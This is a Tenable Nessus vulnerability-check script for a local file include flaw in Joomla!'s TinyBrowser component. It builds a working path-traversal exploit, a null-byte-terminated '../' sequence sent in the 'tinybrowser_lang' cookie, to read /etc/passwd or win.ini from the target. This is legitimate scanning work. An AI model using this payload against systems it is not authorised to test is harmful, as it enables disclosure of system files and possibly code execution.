#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(44337);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_bugtraq_id(37956);
  script_xref(name:"EDB-ID", value:"11262");
  script_xref(name:"EDB-ID", value:"11263");

  script_name(english:"TinyBrowser Component for Joomla! 'tinybrowser_lang' Cookie Local File Include");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the TinyBrowser component for Joomla! running on the
remote host is affected by a local file include vulnerability due to
improper sanitization of user-supplied input to the 'tinybrowser_lang'
cookie before using it in the tiny_mce/plugins/tinybrowser/folders.php
script to include PHP code. Regardless of the PHP 'register_globals'
setting, an unauthenticated, remote attacker can exploit this issue to
disclose arbitrary files or execute arbitrary PHP code on the remote
host, subject to the privileges of the web server user ID.

Note that this installation is likely to be affected by other
vulnerabilities, including one that allows uploading arbitrary files;
however, Nessus has not checked for these.");
  # https://www.joomla.org/announcements/release-news/5243-joomla-1513-security-release-now-available.html
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?879eb3ba");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.5.13 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date",value:"2010/01/27");
  script_set_attribute(attribute:"patch_publication_date",value:"2009/07/22");
  script_set_attribute(attribute:"plugin_publication_date",value:"2010/01/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

# Loop through files to look for.
foreach file (files)
{
  # Try to exploit the issue.
  if (file[0] == '/') traversal = crap(data:"../", length:3*12) + '..';
  else traversal = crap(data:"../", length:3*8);

  if (substr(file, strlen(file)-4) == ".php")
    exploit = traversal + substr(file, 0, strlen(file)-4-1);
  else
    exploit = traversal + file + "%00";

  url = "/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/folders.php";

  res = http_send_recv3(
    method      : "GET",
    port        : port,
    item        : dir + url,
    add_headers : make_array(
      'Cookie', 'tinybrowser_lang='+exploit
    ),
    exit_on_fail : TRUE
  );

  # There's a problem if we see the expected contents.
  body = res[2];
  file_pat = file_pats[file];
  if (!isnull(body) && egrep(pattern:file_pat, string:body))
  {
    if (os && "Windows" >< os)
    {
      line_limit = 10;
      file = str_replace(find:'/', replace:'\\', string:file);
    }
    else line_limit = 2;

    contents = body;
    if ("<!DOCTYPE" >< contents)
      contents = contents - strstr(contents, "<!DOCTYPE");

    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      file        : file,
      line_limit  : line_limit,
      request     : make_list(http_last_sent_request()),
      output      : chomp(contents),
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
